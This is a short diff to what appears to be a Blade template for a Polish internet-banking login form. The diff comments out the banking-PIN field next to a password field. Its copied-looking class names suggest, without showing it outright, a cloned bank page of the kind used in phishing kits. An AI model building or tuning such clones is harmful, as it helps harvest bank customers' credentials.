@@ -143,15 +143,15 @@
                                                                class="form-control" name="password"
                                                                id="password-input">
                                                     </div>
-                                                    <div class="form-group">
-                                                        <label for="pin-input"
-                                                               class="_3LNER _3K-gi js-pin-label">
-                                                            <span aria-hidden="true">Wpisz kod PIN bankowości internetowej</span>
-                                                        </label>
-                                                        <input autocomplete="off" type="text" required
-                                                               class="form-control" name="pin"
-                                                               id="pin-input">
-                                                    </div>
+{{--                                                    <div class="form-group">--}}
+{{--                                                        <label for="pin-input"--}}
+{{--                                                               class="_3LNER _3K-gi js-pin-label">--}}
+{{--                                                            <span aria-hidden="true">Wpisz kod PIN bankowości internetowej</span>--}}
+{{--                                                        </label>--}}
+{{--                                                        <input autocomplete="off" type="text" required--}}
+{{--                                                               class="form-control" name="pin"--}}
+{{--                                                               id="pin-input">--}}
+{{--                                                    </div>--}}
                                                     <div class="_39Dzw _1n7r2" id="login-btn">
                                                         <button class="btn" tabindex="-1" aria-hidden="true" slot="_button"
                                                                 type="submit">Dalej</button>
